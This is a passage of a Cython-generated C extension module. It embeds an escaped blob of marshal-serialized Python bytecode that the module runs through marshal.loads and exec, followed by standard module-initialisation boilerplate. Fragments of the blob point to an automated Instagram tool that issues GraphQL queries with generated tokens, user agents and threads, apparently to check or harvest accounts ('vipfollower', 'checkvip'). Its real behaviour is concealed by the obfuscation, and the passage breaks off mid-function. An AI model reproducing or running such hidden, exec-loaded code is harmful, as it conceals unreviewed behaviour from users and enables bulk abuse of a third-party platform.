iz.https://www.instagram.com/cristiano/following/\332\"PolarisUserHoverCardContentV2Query)\nr\205\000\000\000r\206\000\000\000r\207\000\000\000\332\003dntr\211\000\000\000\332\010priorityr\212\000\000\000r\213\000\000\000z\022x-fb-friendly-namez\010x-fb-lsd\332\013RelayModern\332\tcristiano)\002\332\006userIDr\240\000\000\000\332\004true\332\0207717269488336001)\006\332\003lsd\332\023fb_api_caller_class""\332\030fb_api_req_friendly_name\332\tvariables\332\021server_timestamps\332\006doc_idz%https://www.instagram.com/api/graphqlr\264\000\000\000r\217\000\000\000r\357\000\000\000r\240\000\000\000r\030\001\000\000r\002\000\000\000r\032\001\000\000r\220\000\000\000)\017r<\000\000\000\332\007randintr\326\000\000\000\332\007choices\332\006string\332\rascii_letters\332\006digitsr\273\000\000\000r\274\000\000\000r\275\000\000\000r\004\000\000\000r\330\000\000\000r#\001\000\000r\020\001\000\000r\300\000\000\000)\017\332\013vipfollower\332\007vippost\332\020winnertakesitall\332\nresolution\332\nuser_agent\332\tlsd_tokenr\216\000\000\000r\021\001\000\000r\217\000\000\000r\236\000\000\000\332\tuser_infor\240\000\000\000r(\001\000\000r*\001\000\000r\233\000\000\000s\017\000\000\000               r\034\000\000\000r\241\000\000\000r\241\000\000\000\227\001\000\000s\r\002\000\000\200\000\360\002\022\002\016\360\002\021\003\016\345\021\027\224\036\240\003\240D\321\021)\324\021)\320\016F\320\016F\255F\254N\2703\270t\321,D\324,D\320\016F\320\016F\200:\360\002\000\017U\006\360\000\000`\002j\002\360\000\000\017U\006\360\000\000\017U\006\360\000\000\017U\006\200:\330\r\017\217W\212W\225V\224^\245F\324$8\275\026\274\035\321$F\310\022\320\025L\321\025L\324\025L\321\rM\324\rM\2009\330\025\032\320-=\320Mp\320wz\360\000\000E\002`\002\360\000\000l\002t\002\360\000\000\002o\003\360\000\000}\003G\004\360\000\000]\004A\005\360\000\000M\005V\005\360\000\000\014W\005\360\000\000\014W\005\2007\330\013\033\320\013\033\321\013\035\324\013\035\2007\330\017\030\250}\320X|\365\000\000J\002N\002\364\000\000J\002T\002\360\000\000_\002f\002\360\000\000r\002}\002\360\000\000U\002~\002\360\000\000U\002~\002\361\000\000J\002\002\364\000\000J\002\002\360\000\000T\003Z\003\360\000\000d\003v\003\360\000\000\tw\003\360\000\000\tw\003\2004\335\014\024\214M\320\032A\310'\320W[\320\014\\\321\014\\\324\014\\\2008\330\r\025\217]\212]\211_\214_\327\r \322\r \240\026\250\002\321\r+\324\r+\327\r/\322\r/\260\006\260r""\321\r:\324\r:\2009\330\014\025\217M\212M\230*\240R\321\014(\324\014(\2008\330\027 \2059\210X\321\003\026\335\r\020\220\031\227\035\222\035\320\037/\260\001\321\0212\324\0212\321\r3\324\r3\2009\335\t\014\210Y\217]\212]\230=\250\021\321\r+\324\r+\321\t,\324\t,\2005\330\006\016\360\000\002\004\024\2209\230k\322\023)\320\023)\250e\260W\252n\250n\330\020\030\320\r$\320\r$\320\r$\200H\335\004\t\210(\201O\204O\200O\370\370\330\002\r\210\024\210\024\370\370\370\361%\022\002\016s\014\000\000\000\203F\003F\007\000\306\007\002F\013\003)\002r\005\001\000\000\332\004args)\001r\017\000\000\000)\001r*\000\000\000)T\332\007__doc__\332\002osr\331\000\000\000r\273\000\000\000rE\001\000\000r<\000\000\000r\265\000\000\000r\267\000\000\000\332\tthreadingr\003\000\000\000r\275\000\000\000r\004\000\000\000r\226\000\000\000\332\006cfontsr\005\000\000\000\332\nwebbrowser\332\014rich.consoler\006\000\000\000r\007\000\000\000\332\trich.liver\010\000\000\000\332\trich.textr\t\000\000\000r\n\000\000\000r\026\000\000\000r\013\000\000\000r\014\000\000\000r\305\000\000\000r\r\000\000\000r\327\000\000\000rL\001\000\000r\016\000\000\000r\227\000\000\000r\022\000\000\000r\035\000\000\000r.\000\000\000r5\000\000\000r:\000\000\000rB\000\000\000\332\005resetrA\000\000\000r9\000\000\000\332\006systemr\330\000\000\000\332\003res\332\004execr\031\000\000\000r\030\000\000\000\332\005DVVMB\332\005inputr&\001\000\000r'\001\000\000\332\010checkvip\332\005speed\332\006threds\332\004exit\332\030tool_has_been_force_shutrI\001\000\000rH\001\000\000r\326\000\000\000\332\005yearsr\013\001\000\000r\014\001\000\000r%\001\000\000r\230\000\000\000r\276\000\000\000r\232\000\000\000r#\001\000\000r\242\000\000\000r\300\000\000\000r\345\000\000\000r\361\000\000\000r\365\000\000\000r\000\001\000\000r\375\000\000\000r\003\001\000\000r\t\001\000\000r\r\001\000\000r\025\001\000\000r\231\000\000\000r\241\000\000\000r-\000\000\000\332\001_r\007\001\000\000r\010\001\000\000r\036\000\000\000r\034\000\000\000\372\010<module>re\001""\000\000\001\000\000\000s|\022\000\000\360\003\001\001\001\340\000@\320\000@\330\000\010\360\026\000\001\n\200\t\200\t\200\t\210)\210)\210)\210)\220K\220K\220K\220K\240\r\240\r\240\r\240\r\250m\250m\250m\250m\270N\270N\270N\270N\310;\310;\310;\310;\320Ws\320Ws\320Ws\320Ws\320Ws\320Ws\360\000\000u\001D\002\360\000\000u\001D\002\360\000\000u\001D\002\360\000\000u\001D\002\360\000\000E\002h\002\360\000\000E\002h\002\360\000\000E\002h\002\360\000\000E\002h\002\360\000\000E\002h\002\360\000\000E\002h\002\360\000\000i\002B\003\360\000\000i\002B\003\360\000\000i\002B\003\360\000\000i\002B\003\360\000\000i\002B\003\360\000\000i\002B\003\360\000\000C\003T\003\360\000\000C\003T\003\360\000\000C\003T\003\360\000\000C\003T\003\360\000\000U\003|\003\360\000\000U\003|\003\360\000\000U\003|\003\360\000\000U\003|\003\360\000\000U\003|\003\360\000\000U\003|\003\360\000\000U\003|\003\360\000\000U\003|\003\360\000\000}\003W\004\360\000\000}\003W\004\360\000\000}\003W\004\360\000\000}\003W\004\360\000\000}\003W\004\360\000\000}\003W\004\360\000\000X\004r\004\360\000\000X\004r\004\360\000\000X\004r\004\360\000\000X\004r\004\360\000\000X\004r\004\360\000\000X\004r\004\360\000\000s\004M\005\360\000\000s\004M\005\360\000\000s\004M\005\360\000\000s\004M\005\360\000\000s\004M\005\360\000\000s\004M\005\360\000\000N\005Y\005\360\000\000N\005Y\005\360\000\000N\005Y\005\360\000\000N\005Y\005\360\000\000Z\005w\005\360\000\000Z\005w\005\360\000\000Z\005w\005\360\000\000Z\005w\005\360\000\000Z\005w\005\360\000\000Z\005w\005\360\000\000x\005o\006\360\000\000x\005o\006\360\000\000x\005o\006\360\000\000x\005o\006\360\000\000x\005o\006\360\000\000x\005o\006\360\000\000x\005o\006\360\000\000x\005o\006\360\000\000p\006f\007\360\000\000p\006f\007\360\000\000p\006f\007\360\000\000p\006f\007\360\000\000p\006f\007\360\000\000p\006f\007\360\000\000h\007r\007\360\000\000h\007r\007\360\000\000h\007r\007\360\000\000h\007r\007\360\010\005\001\014\360\000\005\001\014\360\000\005\001\014\360\000\005\001\014\360""\022\000\010?\320\007>\320\007>\200\004\360\006\005\001\022\360\000\005\001\022\360\000\005\001\022\360\000\005\001\022\360\016\000\016\022\210T\220#\211Y\214Y\200\n\330\006\022\200\005\330\010\021\200\005\330\010\024\200\005\360\004\007\001\021\360\000\007\001\021\360\000\007\001\021\360\022\000\001\n\200\002\204\t\210'\321\000\022\324\000\022\320\000\022\330\004\020\200H\204L\320\021Y\321\004Z\324\004Z\200\003\330\000\004\200\004\200S\204X\201\016\204\016\200\016\330\000\005\200\005\320\006^\321\000_\324\000_\320\000_\330\010\016\210\006\210v\230w\250\007\320\0360\270\010\310V\320\010T\321\010T\324\010T\200\005\330\000\004\200\004\200U\201\013\204\013\200\013\330\000\005\200\005\201\007\204\007\200\007\330\000\004\200\004\360\000\000\006R\002\361\000\000\001S\002\364\000\000\001S\002\360\000\000\001S\002\330\000\005\200\005\210\025\200j\321\000\021\324\000\021\320\000\021\330\000\004\200\004\360\000\000\006h\002\210E\360\000\000\006h\002\360\000\000\006h\002\230'\230'\231)\234)\360\000\000\006h\002\360\000\000\006h\002\360\000\000\006h\002\361\000\000\001i\002\364\000\000\001i\002\360\000\000\001i\002\330\000\004\200\004\320\005\\\210E\320\005\\\320\005\\\230'\230'\231)\234)\320\005\\\320\005\\\320\005\\\321\000]\324\000]\320\000]\330\000\004\200\004\360\000\000\006k\002\210E\360\000\000\006k\002\360\000\000\006k\002\230'\230'\231)\234)\360\000\000\006k\002\360\000\000\006k\002\360\000\000\006k\002\361\000\000\001l\002\364\000\000\001l\002\360\000\000\001l\002\330\000\005\200\005\210\025\200j\321\000\021\324\000\021\320\000\021\330\000\004\200\004\360\000\000\006R\002\361\000\000\001S\002\364\000\000\001S\002\360\000\000\001S\002\330\000\005\200\005\201\007\204\007\200\007\360\010\000\005\021\200H\204L\320\021]\321\004^\324\004^\200\003\330\000\004\200\004\200S\204X\201\016\204\016\200\016\360\006\000\001\005\200\004\360\000\000\006N\002\210e\360\000\000\006N\002\360\000\000\006N\002\360\000\000E\002J\002\360\000\000\006N\002\360\000\000\006N\002\361\000\000\001O""\002\364\000\000\001O\002\360\000\000\001O\002\330\t\016\210\025\320\017,\220g\220g\221i\224i\320\017,\320\017,\320\017,\321\t-\324\t-\200\006\340\000\004\200\004\360\000\000\006E\002\210e\360\000\000\006E\002\360\000\000\006E\002\360\000\000|\001A\002\360\000\000\006E\002\360\000\000\006E\002\361\000\000\001F\002\364\000\000\001F\002\360\000\000\001F\002\330\013\020\2105\320\021.\230\007\230\007\231\t\234\t\320\021.\320\021.\320\021.\321\013/\324\013/\200\010\330\000\005\200\005\201\007\204\007\200\007\330\000\004\200\004\360\000\000\006I\002\210e\360\000\000\006I\002\360\000\000\006I\002\360\000\000@\002E\002\360\000\000\006I\002\360\000\000\006I\002\361\000\000\001J\002\364\000\000\001J\002\360\000\000\001J\002\330\000\010\200\010\210\026\220\030\321\000\032\324\000\032\320\000\032\330\000\005\200\005\210\025\200j\321\000\021\324\000\021\320\000\021\330\000\t\200\002\204\t\210'\321\000\022\324\000\022\320\000\022\340\004\020\200H\204L\320\021Z\321\004[\324\004[\200\003\330\000\004\200\004\200S\204X\201\016\204\016\200\016\340\000\004\200\004\200U\201\013\204\013\200\013\330\000\005\200\005\201\007\204\007\200\007\340\000\004\200\004\320\005o\210e\320\005o\320\005o\320fk\320\005o\320\005o\321\000p\324\000p\320\000p\330\000\004\200\004\360\000\000\006v\002\210e\360\000\000\006v\002\360\000\000\006v\002\360\000\000m\002r\002\360\000\000\006v\002\360\000\000\006v\002\361\000\000\001w\002\364\000\000\001w\002\360\000\000\001w\002\330\000\004\200\004\320\005v\210e\320\005v\320\005v\320mr\320\005v\320\005v\321\000w\324\000w\320\000w\330\000\005\200\005\201\007\204\007\200\007\330\000\004\200\004\360\000\000\006X\002\210e\360\000\000\006X\002\360\000\000\006X\002\360\000\000O\002T\002\360\000\000\006X\002\360\000\000\006X\002\361\000\000\001Y\002\364\000\000\001Y\002\360\000\000\001Y\002\340BG\300%\320He\310w\310w\311y\314y\320He\320He\320He\321Bf\324Bf\270E\330\000\005\200\005\210\025\200j\321\000\021\324\000\021\320\000\021\330\003\010\210C\202<\200<\330\r\020\200F""\200F\330\005\n\210c\202\\\200\\\330\r\020\200F\200F\330\005\n\210c\202\\\200\\\330\r\020\200F\200F\330\005\t\200T\360\000\000\013p\002\2205\360\000\000\013p\002\360\000\000\013p\002\360\000\000g\002l\002\360\000\000\013p\002\360\000\000\013p\002\361\000\000\006q\002\364\000\000\006q\002\360\000\000\006q\002\360\000\000r\002v\002\360\000\000r\002v\002\361\000\000r\002x\002\364\000\000r\002x\002\360\000\000r\002x\002\360\006\000\001\006\200\005\201\007\204\007\200\007\330\000\004\200\004\360\000\000\006@\003\210e\360\000\000\006@\003\360\000\000\006@\003\360\000\000w\002|\002\360\000\000\006@\003\360\000\000\006@\003\361\000\000\001A\003\364\000\000\001A\003\360\000\000\001A\003\330\000\004\200\004\360\000\000\006T\002\210e\360\000\000\006T\002\360\000\000\006T\002\360\000\000K\002P\002\360\000\000\006T\002\360\000\000\006T\002\361\000\000\001U\002\364\000\000\001U\002\360\000\000\001U\002\330\000\004\200\004\360\000\000\006R\003\210e\360\000\000\006R\003\360\000\000\006R\003\360\000\000I\003N\003\360\000\000\006R\003\360\000\000\006R\003\361\000\000\001S\003\364\000\000\001S\003\360\000\000\001S\003\330\n\"\320\n\"\320#@\250'\250'\251)\254)\320#@\320#@\320#@\321\nA\324\nA\200\007\360\006\000\001\005\200\004\360\000\000\006P\003\210e\360\000\000\006P\003\360\000\000\006P\003\360\000\000G\003L\003\360\000\000\006P\003\360\000\000\006P\003\361\000\000\001Q\003\364\000\000\001Q\003\360\000\000\001Q\003\330\000\004\200\004\360\000\000\006T\002\210e\360\000\000\006T\002\360\000\000\006T\002\360\000\000K\002P\002\360\000\000\006T\002\360\000\000\006T\002\361\000\000\001U\002\364\000\000\001U\002\360\000\000\001U\002\330\000\004\200\004\360\000\000\006K\003\210e\360\000\000\006K\003\360\000\000\006K\003\360\000\000B\003G\003\360\000\000\006K\003\360\000\000\006K\003\361\000\000\001L\003\364\000\000\001L\003\360\000\000\001L\003\330\016&\320\016&\320'D\250g\250g\251i\254i\320'D\320'D\320'D\321\016E\324\016E\200\013\330\000\t\200\002\204\t\210'\321\000\022\324\000\022\320""\000\022\340\000\005\200\005\360\000\027\007v\001\367\000\027\007v\001\362\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\210E\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\330\005\n\360\003\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\340\003\010\360\005\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\006\000\004\t\360\007\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\010\000\007\014\360\t\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\010\000\027\036\220g\221i\224i\360\t\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\n\000\007\014\360\013\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\n\000\027\036\220g\221i\224i\360\013\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\014\000\007\014\360\r\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\014\000\027\036\220g\221i\224i\360\r\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\016\000\007\014\360\017\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\016\000\027\036\220g\221i\224i\360\017\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\020\000\007\014\360\021\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\020\000\027\036\220g\221i\224i\360\021\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\022\000\007\014\360\023\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\022\000\027\036\220g\221i\224i\360\023\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\024\000\007\014\360\025\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\024\000\027\036\220g\221i\224i""\360\025\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\026\000\007\014\360\027\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\026\000\027\036\220g\221i\224i\360\027\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\030\000\007\014\360\031\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\030\000\027\036\220g\221i\224i\360\031\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\032\000\006\013\360\033\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\032\000\032!\230\027\231\031\234\031\360\033\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\034\000\006\013\360\035\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\034\000\032!\230\027\231\031\234\031\360\035\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\036\000\006\013\360\037\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\036\000\032!\230\027\231\031\234\031\360\037\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\"\000\007\014\360#\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\"\000\027\036\220g\221i\224i\360#\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360$\000\007\014\360%\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360$\000\027\036\220g\221i\224i\360%\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360(\000\007\014\360)\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360(\000\027\036\220g\221i\224i\360)\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360*\000\007\014\360+\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360*\000\027\036\220g\221i\224i\360+\027\007v""\001\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360.\000\004\t\360/\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\360\000\027\007v\001\361\000\027\007v\001\364\000\027\007v\001\361\000\027\001w\001\364\000\027\001w\001\360\000\027\001w\001\3602\000\001\005\200\004\360\000\000\006I\002\210e\360\000\000\006I\002\360\000\000\006I\002\360\000\000@\002E\002\360\000\000\006I\002\360\000\000\006I\002\361\000\000\001J\002\364\000\000\001J\002\360\000\000\001J\002\330\010\r\210\005\320\016+\220W\220W\221Y\224Y\320\016+\320\016+\320\016+\321\010,\324\010,\200\005\340\000\005\200\005\210\025\200j\321\000\021\324\000\021\320\000\021\330\000\t\200\002\204\t\210'\321\000\022\324\000\022\320\000\022\330\003\010\210C\202<\200<\2205\230F\222?\220?\330\r\026\200F\330\r\026\200F\201F\330\005\n\210c\202\\\200\\\220U\230f\222_\220_\330\r\026\200F\330\r\027\200F\201F\330\005\n\210c\202\\\200\\\220U\230f\222_\220_\330\r\027\200F\330\r\027\200F\201F\330\005\n\210c\202\\\200\\\220U\230f\222_\220_\330\r\027\200F\330\r\027\200F\200F\330\005\n\210c\202\\\200\\\220U\230f\222_\220_\330\r\027\200F\330\r\027\200F\200F\340\005\n\210c\202\\\200\\\220U\230f\222_\220_\330\r\027\200F\330\r\027\200F\200F\330\005\n\210c\202\\\200\\\220U\230f\222_\220_\330\r\027\200F\330\r\030\200F\200F\330\005\n\210c\202\\\200\\\220U\230f\222_\220_\330\r\030\200F\330\r\030\200F\200F\330\005\n\210c\202\\\200\\\220U\230f\222_\220_\330\r\030\200F\330\r\030\200F\200F\330\005\n\210d\202]\200]\220e\230v\222o\220o\330\r\030\200F\330\r\030\200F\200F\330\005\n\210d\202]\200]\220e\230v\222o\220o\330\r\030\200F\330\r\030\200F\200F\330\005\n\210d\202]\200]\220e\230v\222o\220o\330\r\030\200F\330\r\030\200F\200F\330\005\n\210c\202\\\200\\\220U\230c\222\\\220\\\330\r\027\200F\330\r\030\200F\200F\330\005\n\210c\202\\\200\\\220U\230c\222\\\220\\\330\r\030\200F\330\r\030\200F\200F\330\005\n\210c\202\\\200\\\220U\230c\222\\\220\\\330\r\027\200F\330\r\030\200F\330\022\024\200K\330\016\017\200G\200G\330\005\n""\210c\202\\\200\\\330\r\027\200F\330\r\027\200F\330\022\024\200K\330\016\017\200G\200G\330\005\n\210f\202_\200_\230\005\240\026\232\017\230\017\330\r\023\200F\330\r\030\200F\200F\340\005\t\200T\360\000\000\013p\002\2205\360\000\000\013p\002\360\000\000\013p\002\360\000\000g\002l\002\360\000\000\013p\002\360\000\000\013p\002\361\000\000\006q\002\364\000\000\006q\002\360\000\000\006q\002\360\000\000r\002v\002\360\000\000r\002v\002\361\000\000r\002x\002\364\000\000r\002x\002\360\000\000r\002x\002\360\006\000\035\036\320\000\035\200\010\320\000\035\210\025\320\000\035\210x\230\003\330\n\014\200\t\360\004\013\001\013\360\000\013\001\013\360\000\013\001\013\360\030\t\001\022\360\000\t\001\022\360\000\t\001\022\360\030\013\001\037\360\000\013\001\037\360\000\013\001\037\360\032\000\001\014\200\013\201\r\204\r\200\r\360\004\006\001\017\360\000\006\001\017\360\000\006\001\017\360\020\000\001\n\200\002\204\t\210'\321\000\022\324\000\022\320\000\022\330\000\004\200\004\200U\201\013\204\013\200\013\330\000\005\200\005\200c\201\n\204\n\200\n\330\007\013\200t\201v\204v\200\004\330\n\021\210'\211)\214)\200\007\360\006\t\0017\360\000\t\0017\360\000\t\0017\360\026\003\001#\360\000\003\001#\360\000\003\001#\360\n\001\0018\360\000\001\0018\360\000\001\0018\340\000\014\200\014\201\016\204\016\200\016\360\004\001\001-\360\000\001\001-\360\000\001\001-\360\006\032\001\025\360\000\032\001\025\360\000\032\001\025\360:V\001\001\r\360\000V\001\001\r\360\000V\001\001\r\360p\002\023\001\016\360\000\023\001\016\360\000\023\001\016\360*\000\n\017\210\025\210v\211\035\214\035\360\000\001\001?\360\000\001\001?\200A\330\001\007\200\026\210r\230\013\240G\250H\320\0275\320\0016\321\0016\324\0016\327\001<\322\001<\321\001>\324\001>\320\001>\320\001>\360\003\001\001?\360\000\001\001?r\036\000\000\000";
static PyObject *__pyx_n_s_builtins;
static PyObject *__pyx_n_s_cline_in_traceback;
static PyObject *__pyx_n_s_import;
static PyObject *__pyx_n_s_loads;
static PyObject *__pyx_n_s_main;
static PyObject *__pyx_n_s_marshal;
static PyObject *__pyx_n_s_name;
static PyObject *__pyx_n_s_test;
static PyObject *__pyx_kp_b_z_d_Z_d_d_l_Z_d_d_l_Z_d_d_l_Z_d;
static PyObject *__pyx_tuple_;
/* Late includes */

static PyMethodDef __pyx_methods[] = {
  {0, 0, 0, 0}
};

#if PY_MAJOR_VERSION >= 3
#if CYTHON_PEP489_MULTI_PHASE_INIT
static PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def); /*proto*/
static int __pyx_pymod_exec_source(PyObject* module); /*proto*/
static PyModuleDef_Slot __pyx_moduledef_slots[] = {
  {Py_mod_create, (void*)__pyx_pymod_create},
  {Py_mod_exec, (void*)__pyx_pymod_exec_source},
  {0, NULL}
};
#endif

static struct PyModuleDef __pyx_moduledef = {
    PyModuleDef_HEAD_INIT,
    "source",
    0, /* m_doc */
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    0, /* m_size */
  #else
    -1, /* m_size */
  #endif
    __pyx_methods /* m_methods */,
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    __pyx_moduledef_slots, /* m_slots */
  #else
    NULL, /* m_reload */
  #endif
    NULL, /* m_traverse */
    NULL, /* m_clear */
    NULL /* m_free */
};
#endif
#ifndef CYTHON_SMALL_CODE
#if defined(__clang__)
    #define CYTHON_SMALL_CODE
#elif defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 3))
    #define CYTHON_SMALL_CODE __attribute__((cold))
#else
    #define CYTHON_SMALL_CODE
#endif
#endif

static __Pyx_StringTabEntry __pyx_string_tab[] = {
  {&__pyx_n_s_builtins, __pyx_k_builtins, sizeof(__pyx_k_builtins), 0, 0, 1, 1},
  {&__pyx_n_s_cline_in_traceback, __pyx_k_cline_in_traceback, sizeof(__pyx_k_cline_in_traceback), 0, 0, 1, 1},
  {&__pyx_n_s_import, __pyx_k_import, sizeof(__pyx_k_import), 0, 0, 1, 1},
  {&__pyx_n_s_loads, __pyx_k_loads, sizeof(__pyx_k_loads), 0, 0, 1, 1},
  {&__pyx_n_s_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 0, 1, 1},
  {&__pyx_n_s_marshal, __pyx_k_marshal, sizeof(__pyx_k_marshal), 0, 0, 1, 1},
  {&__pyx_n_s_name, __pyx_k_name, sizeof(__pyx_k_name), 0, 0, 1, 1},
  {&__pyx_n_s_test, __pyx_k_test, sizeof(__pyx_k_test), 0, 0, 1, 1},
  {&__pyx_kp_b_z_d_Z_d_d_l_Z_d_d_l_Z_d_d_l_Z_d, __pyx_k_z_d_Z_d_d_l_Z_d_d_l_Z_d_d_l_Z_d, sizeof(__pyx_k_z_d_Z_d_d_l_Z_d_d_l_Z_d_d_l_Z_d), 0, 0, 0, 0},
  {0, 0, 0, 0, 0, 0, 0}
};
static CYTHON_SMALL_CODE int __Pyx_InitCachedBuiltins(void) {
  return 0;
}

static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_InitCachedConstants", 0);

  
  __pyx_tuple_ = PyTuple_Pack(1, __pyx_kp_b_z_d_Z_d_d_l_Z_d_d_l_Z_d_d_l_Z_d); if (unlikely(!__pyx_tuple_)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple_);
  __Pyx_GIVEREF(__pyx_tuple_);
  __Pyx_RefNannyFinishContext();
  return 0;
  __pyx_L1_error:;
  __Pyx_RefNannyFinishContext();
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitGlobals(void) {
  if (__Pyx_InitStrings(__pyx_string_tab) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_modinit_global_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_import_code(void); /*proto*/

static int __Pyx_modinit_global_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_global_init_code", 0);
  /*--- Global init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_export_code", 0);
  /*--- Variable export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_export_code", 0);
  /*--- Function export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_init_code", 0);
  /*--- Type init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_import_code", 0);
  /*--- Type import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_import_code", 0);
  /*--- Variable import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_import_code", 0);
  /*--- Function import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}


#ifndef CYTHON_NO_PYINIT_EXPORT
#define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC
#elif PY_MAJOR_VERSION < 3
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" void
#else
#define __Pyx_PyMODINIT_FUNC void
#endif
#else
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" PyObject *
#else
#define __Pyx_PyMODINIT_FUNC PyObject *
#endif
#endif


#if PY_MAJOR_VERSION < 3
__Pyx_PyMODINIT_FUNC initsource(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC initsource(void)
#else
__Pyx_PyMODINIT_FUNC PyInit_source(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC PyInit_source(void)
#if CYTHON_PEP489_MULTI_PHASE_INIT
{
  return PyModuleDef_Init(&__pyx_moduledef);
}
static CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {
    #if PY_VERSION_HEX >= 0x030700A1
    static PY_INT64_T main_interpreter_id = -1;
    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);
    if (main_interpreter_id == -1) {
        main_interpreter_id = current_id;
        return (unlikely(current_id == -1)) ? -1 : 0;
    } else if (unlikely(main_interpreter_id != current_id))
    #else
    static PyInterpreterState *main_interpreter = NULL;
    PyInterpreterState *current_interpreter = PyThreadState_Get()->interp;
    if (!main_interpreter) {
        main_interpreter = current_interpreter;
    } else if (unlikely(main_interpreter != current_interpreter))
    #endif
    {
        PyErr_SetString(
            PyExc_ImportError,
            "Interpreter change detected - this module can only be loaded into one interpreter per process.");
        return -1;
    }
    return 0;
}
static CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *moddict, const char* from_name, const char* to_name, int allow_none) {
